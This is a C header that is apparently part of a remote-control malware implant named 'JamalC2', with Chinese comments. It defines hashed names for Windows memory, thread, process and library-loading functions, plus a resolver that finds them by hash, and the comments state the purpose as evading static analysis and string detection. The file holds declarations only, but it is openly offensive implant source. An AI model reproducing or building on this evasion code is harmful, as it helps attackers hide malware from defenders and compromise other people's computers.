/*
 * JamalC2 Implant - Dynamic API Resolution Header
 * 动态 API 解析 - 避免静态分析识别敏感 API
 */

#ifndef DYNAPI_H
#define DYNAPI_H

#include <windows.h>

// === API 哈希值 (DJB2) ===
// 使用哈希代替明文函数名，避免字符串分析

// kernel32.dll
#define HASH_VIRTUALALLOC 0x91AFCA54
#define HASH_VIRTUALFREE 0x30633AC
#define HASH_VIRTUALPROTECT 0x10066F2F
#define HASH_CREATETHREAD 0x544E6039
#define HASH_CREATEPROCESSA 0x16FDFE58
#define HASH_LOADLIBRARYA 0x5FBFF0FB
#define HASH_GETPROCADDRESS 0x7C0DFEE6

// ntdll.dll
#define HASH_NTALLOCATEVIRTUALMEMORY 0xF783B8EC
#define HASH_NTFREEVIRTUALMEMORY 0x2802C609
#define HASH_NTPROTECTVIRTUALMEMORY 0x50E92888

// === 函数类型定义 ===

typedef LPVOID(WINAPI *fn_VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize,
                                        DWORD flAllocationType,
                                        DWORD flProtect);

typedef BOOL(WINAPI *fn_VirtualFree)(LPVOID lpAddress, SIZE_T dwSize,
                                     DWORD dwFreeType);

typedef BOOL(WINAPI *fn_VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize,
                                        DWORD flNewProtect,
                                        PDWORD lpflOldProtect);

typedef HANDLE(WINAPI *fn_CreateThread)(
    LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,
    DWORD dwCreationFlags, LPDWORD lpThreadId);

typedef BOOL(WINAPI *fn_CreateProcessA)(
    LPCSTR lpApplicationName, LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles,
    DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

typedef HMODULE(WINAPI *fn_LoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC(WINAPI *fn_GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);

// === 全局函数指针 ===

extern fn_VirtualAlloc pVirtualAlloc;
extern fn_VirtualFree pVirtualFree;
extern fn_VirtualProtect pVirtualProtect;
extern fn_CreateThread pCreateThread;
extern fn_CreateProcessA pCreateProcessA;
extern fn_LoadLibraryA pLoadLibraryA;
extern fn_GetProcAddress pGetProcAddress;

// === 初始化函数 ===

/**
 * 初始化所有动态 API
 * @return 0 成功, -1 失败
 */
int dynapi_init(void);

/**
 * DJB2 哈希算法
 */
unsigned int dynapi_hash(const char *str);

/**
 * 通过哈希解析导出函数
 * @param hModule 模块句柄
 * @param hash 函数名哈希
 * @return 函数地址, 或 NULL
 */
void *dynapi_resolve_by_hash(HMODULE hModule, unsigned int hash);

#endif // DYNAPI_H
